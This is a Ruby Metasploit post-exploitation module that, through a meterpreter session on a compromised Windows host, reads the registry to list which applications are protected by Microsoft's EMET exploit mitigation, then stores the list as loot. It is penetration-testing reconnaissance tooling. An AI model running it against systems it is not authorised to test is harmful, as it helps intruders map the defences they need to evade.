##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'

class MetasploitModule < Msf::Post

  include Msf::Post::Windows::Registry
  include Msf::Post::Common

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Gather EMET Protected Paths',
        'Description'   => %q{ This module will enumerate the EMET protected paths on the target host.},
        'License'       => MSF_LICENSE,
        'Author'        => [ 'vysec <vincent.yiu[at]mwrinfosecurity.com>'],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))

  end

 def run
    if sysinfo['Architecture'] =~ /x64/
        reg_vals = registry_enumvals('HKLM\\SOFTWARE\\Microsoft\\EMET\\AppSettings',REGISTRY_VIEW_64_BIT)
    else
      reg_vals = registry_enumvals('HKLM\\SOFTWARE\\Microsoft\\EMET\\AppSettings',REGISTRY_VIEW_32_BIT)
    end 
    
    t = ""

    reg_vals.each do |x|
        t << "#{x}\r\n"
    end

    puts t

    p = store_loot("host.emet_paths", "text/plain", session, t, "emet_paths.txt", "EMET Paths")
    print_status("Results stored in: #{p}")
  end

end
